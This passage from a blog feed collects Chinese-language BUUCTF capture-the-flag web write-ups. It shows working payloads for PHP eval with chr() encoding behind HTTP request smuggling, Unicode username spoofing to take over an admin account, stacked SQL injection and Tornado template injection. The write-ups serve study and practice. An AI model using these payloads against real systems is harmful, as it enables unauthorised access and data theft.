img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> .user.ini文件的利用，文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF Easy Calc</title>
      <link href="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/"/>
      <url>/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/1.jpg" alt=""></p><a id="more"></a><p>查看源代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>I've <span class="token keyword">set</span> up WAF to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class="alert alert-success">            &lt;strong>答案:&lt;/strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">            &lt;/div>`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>有一个<code>calc.php</code>,跟进去看看<br>发现waf代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>waf过滤了’ ‘,’\t’,’\r’,’\n’,’'‘,’”‘,’`’,’[‘,’]’,’$’,’'<br>其中以get方式给num传参</p><p>由于前端设置了waf，所以只要我们的访问请求中包含非法字符就会返回403，无法访问到后端<br>在这样的情况下我们就可以使用HTTP走私来绕过前端waf直接访问后端</p><p>关于HTTP走私的介绍网上有许多师傅做了讲解，在这里就不多叙述了<br>(HTTP走私)[<a href="https://xz.aliyun.com/t/6654]" target="_blank" rel="noopener">https://xz.aliyun.com/t/6654]</a><br>(http请求走私(HTTP Request Smuggling))[<a href="https://blog.csdn.net/qq_37865996/article/details/102529396]" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/article/details/102529396]</a><br>贴两个链接</p><p>在这里，我们可以使用CL-CL方式来进行http走私，当然其他的方式也一样可以<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/2.jpg" alt=""><br>前端服务器读取完num=1之后，将数据包原封不动地转发给后端，后端读取到<code>?num=phpinfo()</code>后，返回给我们<code>phpinfo()</code><br>在这一题里有几个PHP函数需要我们注意</p><pre class=" language-bash"><code class="language-bash">scandir<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数返回指定目录中的文件和目录的数组。var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span>函数：var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数用于输出变量的相关信息。var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回false。您可以通过 @readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 形式调用该函数，来隐藏错误信息。</code></pre><p>我们可以使用<code>scandir("\")</code>来扫描根目录，但””被禁了，所以这样子不行，我们可以把\转为ASCII码，然后再转为字符，</p><pre class=" language-bash"><code class="language-bash">chr<span class="token punctuation">(</span><span class="token punctuation">)</span>chr<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数从指定的 ASCII 值返回字符。ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</code></pre><p>所以我们可以构造成<code>scandir(chr(47))</code>来扫描根目录<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/3.jpg" alt=""><br>找到了flag存放的目录<br>接下来，我们需要从f1agg目录中读取flag<br>构造payload</p><pre class=" language-bash"><code class="language-bash">?num<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>readfile<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>47<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>102<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>49<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>97<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code>就是/f1agg<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/4.jpg" alt=""><br>flag到手</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> http走私 </tag>
            
            <tag> PHP的字符串解析特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF admin</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-admin/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-admin/</url>
      
        <content type="html"><![CDATA[<p>打开环境，有注册和登录两个功能<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/1.jpg" alt=""></p><a id="more"></a><p>查看源代码，看到提示<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/2.jpg" alt=""><br>猜测需要以admin账号登陆才能拿到flag<br>那么先注册一个账号看看(admin账号已被注册)<br>注册账号后一共有四个选项<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/3.jpg" alt=""><br>首先看到post功能<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/4.jpg" alt=""><br>一个编辑留言的地方，可能会有xss之类的漏洞？我不太清楚，因为我目前并不会xss<br>再看到change password功能，查看源代码<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/5.jpg" alt=""><br>给出了源代码的GitHub地址<br>那就过去看看<br>分析routes.py<br>路由的功能不多，注册，登录，登出，编辑和修改密码</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></code></pre><p>从注册开始分析<br>注意到接收username这里使用了一个<code>strlower</code>函数<br>看起来是使字符串小写的函数，但python内置<code>lower()</code>函数，为什么要自己写一个函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>事实上，不止注册这里，登录和修改密码处同样使用了<code>strlower</code>函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>那我们就去看看这个<code>strlower</code>函数是什么样的</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>这里面使用了nodeprep.prepare()函数，这个函数对应的库是twisted<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/7.jpg" alt=""><br>这么一对比，发现源码中使用的twisted库的版本实在太低了<br><a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">参考这篇文章</a><br>这样一来我们就能形成一个攻击链<br>登陆时会调用一次<code>strlower</code>，修改密码时又会调用一次<code>strlower</code>，只要我们的用户名经过两次调用后变成了admin，我们就可以修改admin用户的密码然后重新登陆了</p><pre class=" language-bash"><code class="language-bash">ᴬᴰᴹᴵᴺ -<span class="token operator">></span> ADMIN -<span class="token operator">></span> admin</code></pre><p>admin的Unicode编码可以在网上找到<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/8.jpg" alt=""><br>成功拿到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Unicode欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF EasySQL</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/</url>
      
        <content type="html"><![CDATA[<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/1.jpg" alt=""></p><a id="more"></a><p>这题和强网杯随便注一样，都是堆叠注入<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/3.jpg" alt=""><br>通过show tables可以看到Flag表<br>但想要看到列就不行了<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/4.jpg" alt=""><br>通过burpfuzz一下，能看到过滤了挺多关键字的</p><hr><p>有点难顶，只能看wp了</p><pre class=" language-sql"><code class="language-sql">官方解:<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span></code></pre><p>而这道题的sql语句是这样的</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> $post<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>拼接一下就变成了这样</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>关于 sql_mode :<br>它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 “或” 运算符<br><a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">MySQL sql_mode 说明</a><br>所以，当set sql_mode=pipes_as_concat执行后，会把select 1和select flag的结果拼接起来<br>老实说，我实在想不出来这题的sql语句竟然是这样的<br>还是我太菜了<br>所以我更倾向于非预期解</p><pre class=" language-bash"><code class="language-bash">*,1</code></pre><p>拼接到sql语句中就是</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>这样就是选择所有，一样能爆flag</p><p>总的来说，无论是官方解还是非预期解，我都能从中学到一些东西，一个扩宽知识面，一个开阔思路</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> mysql_sql_mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF easy_tornado</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/1.jpg" alt=""></p><a id="more"></a><p>有三个页面，挨个访问看看</p><pre class=" language-bash"><code class="language-bash">/flag.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/2.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/welcome.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/3.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/hints.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/4.jpg" alt=""><br>开始分析<br>第一个页面告诉我们flag in /fllllllllllllag<br>hint告诉我们</p><pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>cookie_secret+md5<span class="token punctuation">(</span>filename<span class="token punctuation">))</span></code></pre><p>也就是filename的md5值加上cookie_secret再md5<br>我们想要进入到fllllllllllllag，filename已经知道了，剩下cookie_secret不知道<br>在测试的过程中，会出现这样一个页面</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span>Error</code></pre><p>通过百度知道<br>tornado是python中的一个web应用框架<br>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>再加上error?msg=Error这个页面<br>怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击(SSTI)</a><br>经过测试，确实存在模板注入<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/5.jpg" alt=""><br>然后通过查阅各种资料，发现对于tornado框架存在附属文件handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payload为</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler.settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>得到cookie_secret</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'cookie_secret'</span><span class="token keyword">:</span> <span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><span class="token punctuation">}</span></code></pre><p>然后写一个脚本得到最后的filehash</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>    cookie_secret<span class="token operator">=</span><span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>最后的filehash为</p><pre class=" language-bash"><code class="language-bash">16a4ec873339e7847bf28e0e0b33803e</code></pre><p>然后构造payload为</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>16a4ec873339e7847bf28e0e0b33803e</code></pre><p>得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/6.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 强网杯-随便注</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<p>打开环境，看到这样的页面<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/1.jpg" alt=""></p><a id="more"></a><p>加’引号测试<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/2.jpg" alt=""><br>报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/3.jpg" alt=""><br>加注释<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/4.jpg" alt=""><br>恢复正常，所以可以判断是单引号的注入</p><p>之后开始判断列数<br>order by测试到3的时候报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/5.jpg" alt=""><br>所以一共有两列<br>判断完列数，开始union注入，但回显告诉我们过滤了很多关键字<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/6.jpg" alt=""><br>之后尝试了许多方法想要绕过，但都没有什么效果<br>然后就是学到的新东西了，堆叠注入<br>首先用show databases;爆库<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/7.jpg" alt=""><br>然后show tables;报表<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/8.jpg" alt=""><br>可以看到一共有两个表<br>words和1919810931114514<br>然后查询words表里所有的列</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/9.jpg" alt=""><br>words表里一共两列，id和data，结合我们用1查询出来的结果，也是一个序号一个字符串，所以基本确定我们当前所在的表就是words表<br>再查询1919810931114514表的列</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token punctuation">(</span>纯数字需要用反引号括起来<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/10.jpg" 